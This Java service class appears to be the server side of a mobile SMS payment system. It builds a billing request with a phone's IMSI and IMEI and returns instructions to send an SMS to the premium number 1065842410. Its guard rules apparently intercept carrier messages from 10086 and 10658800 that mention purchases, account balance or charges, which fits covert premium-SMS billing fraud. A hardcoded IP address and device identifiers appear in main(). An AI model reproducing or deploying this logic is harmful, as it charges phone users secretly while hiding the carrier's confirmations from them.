package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.log4j.Logger;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.PostData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;
import com.jxt.pay.appclient.utils.StringUtils;

public class LxtxMmDynamicService implements IDynamicService{

	private static Logger logger = Logger.getLogger(LxtxMmDynamicService.class);
	
	private static final String TYPE = "lxtxMm";
	
	private static final String PARAM = "<?xml version=\"1.0\" encoding=\"UTF-8\" ?><SmsInitReq><MsgType>SmsBillReq</MsgType><AppID>{appid}</AppID><PayCode>{paycode}</PayCode><Imsi>{imsi}</Imsi><Imei>{imei}</Imei><UA>Huawei</UA></SmsInitReq>";
	
	private static final String DEST = "1065842410";
	
	private int timeOut = 60;
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final Guard guard1 = new Guard("10658800","成功购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();
	
	@Override
	public String dynamic(Map<String, String> map) {
		String xml = null;
		
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String appid = StringUtils.defaultString(map.get("appid"));
			String paycode = StringUtils.defaultString(map.get("paycode"));
			String imsi = StringUtils.defaultString(map.get("imsi"));
			String imei = StringUtils.defaultString(map.get("imei"));
			
			String param = PARAM.replace("{paycode}", paycode).replace("{appid}",appid).replace("{imsi}",imsi).replace("{imei}",imei);
			
			String responseXml = new PostData().PostData(param.getBytes(), url);
					
			if(responseXml != null && responseXml.length() > 0 && !"null".equals(responseXml)){
				
				tryMap.remove(channel);
				
				try{
					xml = parseXml(map,responseXml);
				}catch(Exception e){
					return DynamicUtils.parseError("597");
				}
			}else{
				logger.info("responseXml is null");
				return DynamicUtils.parseWait(15,map);
			}
		}
		
		return xml;
	}

	private String parseXml(Map<String, String> map,String data){
		
		
		if(data != null && data.length() > 0){
			String content = SingleXmlUtil.getNodeValue(data, "Content");
			
			if(content != null && content.length() > 10){
				
				Sms sms = new Sms();
				
				sms.setSmsContent(content);
				sms.setSmsDest(DEST);
				sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
				
				Sms guardSms = new Sms();
				
				List<Guard> guardList = new ArrayList<Guard>();
				
				guardList.add(guard1);
				guardList.add(guard2);
				
				guardList.add(guard3);
				guardList.add(guard4);
				
				guardSms.setGuardList(guardList);
				
				StringBuffer sb = new StringBuffer();
				
				sb.append(XstreamHelper.toXml(guardSms));
				sb.append(XstreamHelper.toXml(sms));
				
				return sb.toString();
			
			}
		}
		
		return null;
	}
	
	public static void main(String[] args){
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", "http://119.29.52.164:9980/mmsms");
		map.put("channel", "106208a001001001");
		map.put("appid", "5152004");
		map.put("paycode", "12");
		map.put("imei","862949029214504");
		map.put("imsi", "460022101441340");
		
		
		String xml = new LxtxMmDynamicService().dynamic(map);
		
		System.out.println(xml);
	}
}
